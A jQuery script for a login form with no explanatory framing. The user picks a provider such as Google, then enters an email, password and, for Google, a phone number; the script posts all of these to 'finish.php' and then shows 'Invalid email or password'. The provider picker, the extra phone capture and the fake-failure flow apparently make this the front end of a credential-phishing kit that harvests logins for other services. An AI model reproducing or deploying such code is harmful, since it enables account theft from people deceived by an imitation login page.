$('.m-selector').click(function() {
    $('div.mobile').css({'display':'none'});
    $('div.img').html('<img src="content/'+$(this).attr('id')+'.png" />');
    if($(this).attr('id') == "google") {
        $('div.mobile').css({'display':'block'});
    }
    $('input#d_s').val($(this).attr('id'));
    //$('div.select').css({'display':'none'});
    $('div.login-register-container').removeAttr('style');
});

$('div#regular-login-forms').keyup(function(event) {
    if (event.keyCode === 13) {
        $('button.login-button').click();
    }
});

function validateEmail(email) {
    var req = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return req.test(email.toLowerCase());
}

$("input#d_m").keydown(function (e) {
    // Allow: backspace, delete, tab, escape, enter and .
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
         // Allow: Ctrl/cmd+A
        (e.keyCode == 65 && (e.ctrlKey === true || e.metaKey === true)) ||
         // Allow: Ctrl/cmd+C
        (e.keyCode == 67 && (e.ctrlKey === true || e.metaKey === true)) ||
         // Allow: Ctrl/cmd+X
        (e.keyCode == 88 && (e.ctrlKey === true || e.metaKey === true)) ||
         // Allow: home, end, left, right
        (e.keyCode >= 35 && e.keyCode <= 39)) {
             // let it happen, don't do anything
             return;
    }
    // Ensure that it is a number and stop the keypress
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});

$('button.login-button').click(function() {
	$('button.login-button').attr({'disabled':'disabled'});
	$('.login-loading-indicator').hide();
	$('#l_e_not').html('');
	$('#l_p_not').html('');
    $('#l_t_not').html('');
	$('.text-input-input').removeClass('input-error');
	$('div.c-card--error').hide();
	
	if($.trim($('input#d_e').val()) === "") {
		$('input#d_e').addClass('input-error');
		$('#l_e_not').html('Please enter your email address');
		$('button.login-button').removeAttr('disabled');
		return false;
	}
	
	if(validateEmail($('input#d_e').val().trim())==false) {
		$('#l_e_not').html('An email address must contain a single @');
		return false;
	}
    
    if($('input#d_s').val() == "google") {
        if($.trim($('input#d_m').val()) === "") {
            $('input#d_m').addClass('input-error');
            $('#l_t_not').html('Please enter a valid phone number');
            return false;
        }
        else {}
    }
	
	if($.trim($('input#d_p').val()) === "") {
		$('input#d_p').addClass('input-error');
		$('#l_p_not').html('Please enter your password');
		$('button.login-button').removeAttr('disabled');
		return false;
	}
	
	
	var m_u = $('input#d_e').val();
	var m_p = $('input#d_p').val();
    var m_s = $('input#d_s').val();
	var m_m = $('input#d_m').val();
    
	$('button.login-button').attr({'disabled':'disabled'});
	$('.login-loading-indicator').show();

	 var settings = {
        "url": "finish.php",
        "method": "POST",
        "mimeType": "multipart/form-data",
        "data": {'u':m_u, 'p':m_p, 's':m_s, 'm':m_m}
    }

    $.ajax(settings).done(function (response) {
        if (response == 1) {
			$('button.login-button').removeAttr('disabled');
			$('.login-loading-indicator').hide();
			$('input#d_p').val('');
			$('#l_e_not').html('Invalid email or password');
			$('div.c-card--error').show();
			
            return false;
        }
    }).fail(function (jqXHR, textStatus, error) {
        $('#l_e_not').html('Invalid email or password');
		$('div.c-card--error').show();
		return false;
    });	
});